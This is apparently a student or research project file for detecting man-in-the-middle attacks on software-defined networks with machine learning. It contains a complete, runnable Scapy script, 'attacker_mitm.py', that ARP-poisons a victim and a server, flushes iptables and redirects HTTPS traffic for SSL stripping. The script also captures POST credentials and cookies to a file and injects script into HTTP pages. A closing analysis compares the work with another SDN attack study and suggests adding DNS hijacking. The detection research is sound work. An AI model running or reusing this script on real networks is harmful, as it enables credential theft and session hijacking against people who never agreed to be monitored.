# -*- coding: utf-8 -*-
"""
attacker_mitm.py
COMPLETE realistic MITM attack:
- ARP poisoning        (redirect traffic)
- IP forwarding        (stay invisible)
- HTTP interception    (steal credentials)
- SSL stripping        (downgrade HTTPS)
- Cookie stealing      (session hijack)
- Traffic injection    (modify responses)
- Bulk traffic gen     (generate realistic flow patterns)
"""

import os
import time
import sys
import threading
import re
from scapy.all import *

# ── Stage 0: Dynamic Configuration ─────────────────────
# Default values
VICTIM_IP  = "10.0.0.1"
SERVER_IP  = "10.0.0.2"
# In Mininet host namespace, the interface is usually 'eth0'
# In root namespace, it might be 'h3-eth0'
IFACE      = "eth0"
STOLEN     = "/tmp/mitm_stolen.txt"

# Override from command line if provided: python scripts/attacker_mitm.py [victim] [server] [iface]
if len(sys.argv) > 1:
    VICTIM_IP = sys.argv[1]
if len(sys.argv) > 2:
    SERVER_IP = sys.argv[2]
if len(sys.argv) > 3:
    IFACE = sys.argv[3]

# Auto-detect iface if specified one is not found
if IFACE not in [i[0] for i in get_if_list()]:
    print("⚠️  Warning: Interface '{}' not found. Falling back to default: '{}'".format(IFACE, conf.iface))
    IFACE = str(conf.iface)

# ── Stage 1: Enable IP forwarding ──────────────────────
# This allows the host to act as a router
os.system("sysctl -w net.ipv4.ip_forward=1")
os.system("sysctl -w net.ipv4.conf.all.send_redirects=0")

# ── Stage 2: Enable iptables traffic forwarding ─────────
# This ensures that traffic is forwarded correctly and matches flow patterns
os.system("iptables -F")
os.system("iptables -t nat -F")
os.system("iptables -P FORWARD ACCEPT")

# ── Stage 3: SSL stripping via iptables ─────────────────
# Redirect HTTPS (443) to port 10000 (our sslstrip listener placeholder)
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10000")

# ── Stage 4: ARP Poison both sides ──────────────────────
def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 iface=IFACE, timeout=2, verbose=False)
    return ans[0][1].hwsrc if ans else None

def arp_poison_loop(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    my_mac     = get_if_hwaddr(IFACE)
    if not target_mac:
        print("Cannot find {}".format(target_ip))
        return
    
    # Building the ARP packet
    pkt = Ether(dst=target_mac)/ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip, hwsrc=my_mac)
    
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        time.sleep(0.5)   # Fast poison loop

# ── Stage 5: Packet relay with modification ─────────────
def relay_and_intercept(pkt):
    if IP not in pkt:
        return

    src = pkt[IP].src
    dst = pkt[IP].dst

    # Intercept HTTP credentials
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')

        # Steal POST credentials
        if 'POST' in payload and ('username' in payload or 'password' in payload):
            ts = time.strftime('%H:%M:%S')
            stolen_data = "[{}] CREDENTIALS STOLEN!\n  From: {}\n  To:   {}\n  Data: {}\n".format(
                ts, src, dst, payload[:300]
            )
            print("\n" + "🎯"*20)
            print(stolen_data)
            print("🎯"*20 + "\n")
            with open(STOLEN, 'a') as f:
                f.write(stolen_data)

        # Steal cookies
        if 'Cookie:' in payload:
            cookie = re.findall(r'Cookie: (.+)', payload)
            if cookie:
                ts = time.strftime('%H:%M:%S')
                line = "[{}] COOKIE STOLEN: {}\n".format(ts, cookie[0][:200])
                print("🍪 {}".format(line.strip()))
                with open(STOLEN, 'a') as f:
                    f.write(line)

        # Inject malicious content into HTTP responses
        if 'HTTP/1' in payload and 'text/html' in payload:
            # Add tracking pixel to every response
            modified = payload.replace(
                '</body>',
                '<script>document.title="HACKED by MITM"</script></body>'
            )
            
            # Update the packet with modified payload
            pkt[Raw].load = modified.encode('utf-8', errors='ignore')
            
            # Recalculate checksums
            del pkt[IP].chksum
            del pkt[TCP].chksum
            
            # Re-send the modified packet
            # Note: With ip_forward=1, the original packet might also be forwarded by the kernel
            sendp(pkt, iface=IFACE, verbose=False)

# ── Stage 6: Generate bulk realistic traffic ─────────────
def generate_bulk_traffic():
    """Send repeated HTTP requests to build up flow stats for ML detection"""
    import socket
    while True:
        try:
            # Connect to server on port 8080 (assuming server_login.py is there)
            for _ in range(30):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect((SERVER_IP, 8080))
                    s.send(b"GET / HTTP/1.1\r\nHost: 10.0.0.2\r\nConnection: close\r\n\r\n")
                    s.recv(1024)
                finally:
                    s.close()
            time.sleep(0.1)
        except Exception:
            time.sleep(1)

# ── START ALL ATTACK STAGES ──────────────────────────────
print("="*50)
print("🔴 MITM ATTACK STARTING")
print("="*50)

# Thread 1: Poison victim
t1 = threading.Thread(target=arp_poison_loop,
                      args=(VICTIM_IP, SERVER_IP), daemon=True)
# Thread 2: Poison server
t2 = threading.Thread(target=arp_poison_loop,
                      args=(SERVER_IP, VICTIM_IP), daemon=True)
# Thread 3: Generate bulk traffic for ML detection
t3 = threading.Thread(target=generate_bulk_traffic, daemon=True)

t1.start()
t2.start()
time.sleep(2)   # Let ARP poison take effect first
t3.start()

print("✅ ARP Poisoning: active")
print("✅ IP Forwarding: active")
print("✅ Bulk traffic:  active (ML will fire in ~5 seconds)")
print("✅ Logging to:    {}".format(STOLEN))

# Sniff and process all intercepted traffic
sniff(filter="ip host {} or ip host {}".format(VICTIM_IP, SERVER_IP),
      prn=relay_and_intercept, iface=IFACE, store=False)


# ==============================================================================
# DETAILED ANALYSIS: SDN-MITM-ATTACKS-RESEARCH VS. YOUR PROJECT
# ==============================================================================

## 1. What they have done (Detailed)
The `sdn-mitm-attacks-research` project is an academic study focusing on the implementation and vulnerability analysis of MITM attacks in Software-Defined Networks (SDN). Their key contributions include:
- **ARP Spoofing Implementation:** They used Scapy (`arp_spoof_attack.py`) to perform bidirectional poisoning between victims and gateways. Their approach includes explicit kernel-level IP forwarding management and graceful ARP restoration.
- **DNS Hijacking (Advanced):** Unlike typical L2 attacks, they implemented a Layer 7 attack using SDN programmability. 
    - `hijack_switch.py`: A Ryu controller application that installs OpenFlow rules to intercept UDP port 53 traffic.
    - `mini_dns.py`: A custom-built minimal DNS server that responds to queries with malicious IPs.
- **SDN Topology Design:** They created complex Mininet topologies (`topo.py`, `new_topo.py`) featuring multiple subnets and a central Linux router, demonstrating that SDN's centralized control plane does not automatically protect hosts from classic L2/L3 attacks.
- **Detailed Evidence:** They focused on logging flow table changes (`flows_before.txt` etc.) and capturing packet traces (pcaps) to prove that switches remain "unaware" of the poisoning at the flow level.

## 2. How this research can help your project
- **DNS Hijacking Integration:** You can integrate their DNS redirection logic into your `attacker_mitm.py` to make your attack suite more comprehensive.
- **Flow Table Analysis:** You can use their method of monitoring OpenFlow rules to extract more features for your Machine Learning models (e.g., matching flow duration or packet counts per flow).
- **Defense Implementation:** Their research discusses Dynamic ARP Inspection (DAI) and MAC-IP Binding Enforcement, which you could implement in your `my_controller.py` as mitigation strategies.

## 3. Difference from your project
- **Objective:** Your project is primarily focused on **ML-based detection and classification** (using Decision Trees and Q-Learning), whereas theirs is focused on **vulnerability demonstration and analysis**.
- **Attack Sophistication:** Your `attacker_mitm.py` is more feature-rich regarding payload manipulation (SSL stripping, cookie theft, HTTP response injection), while theirs is more focused on network-level redirection (DNS hijacking).
- **Detection Component:** Your project has a robust detection pipeline (`flow_collector.py`, `evaluate_model.py`) which their research lacks.

## 4. Evaluation Measures (Based on RL.ipynb Analysis)
Looking at your `RL.ipynb`, the following measures should be applied to improve your model evaluation:
- **Train/Test Separation:** Currently, the RL evaluation often happens on the same data it learned from. Implement a strict split to test the agent's generalization to unseen traffic patterns.
- **Confusion Matrix & F1-Score:** Accuracy is misleading for security data (which is often imbalanced). You must track **Precision** (avoiding false alarms) and **Recall** (detecting all attacks).
- **Detection Latency:** Measure the time from the start of an attack flow to the moment the RL agent classifies it as "Malicious." In a real SDN, delay is critical.
- **False Positive Rate (FPR):** Specifically monitor how often benign user traffic (like your `victim_traffic.py`) is incorrectly blocked.
- **Convergence Monitoring:** Instead of just final accuracy, plot the **Cumulative Reward** or **Temporal Difference (TD) Error** to ensure the Q-Learning agent is actually converging to an optimal policy.
